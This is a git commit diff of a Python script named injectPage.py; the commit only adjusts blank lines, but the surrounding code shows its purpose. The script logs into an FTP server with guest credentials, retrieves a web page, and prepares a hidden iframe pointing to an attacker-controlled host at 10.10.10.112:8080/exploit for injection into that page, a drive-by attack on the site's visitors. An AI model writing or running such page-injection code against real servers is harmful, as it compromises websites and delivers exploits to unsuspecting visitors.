7b4c0805de71ed771d9c55817d7de3b967dae899
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2018-03-09 10:49:38 -0700

    Update injectPage.py

--- injectPage.py
+++ injectPage.py
@@ -2,7 +2,6 @@
 # -*- coding: utf-8 -*-
 import ftplib
 
-
 def injectPage(ftp, page, redirect):
     f = open(page + '.tmp', 'w')
     ftp.retrlines('RETR' + page, f.write)
@@ -19,6 +18,7 @@ def injectPage(ftp, page, redirect):
 host = '192.168.0.1'
 username = 'guest'
 password = 'guest'
+
 ftp = ftplib.FTP(host)
 ftp.login(username, password)
 redirect = '<iframe src=' + '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
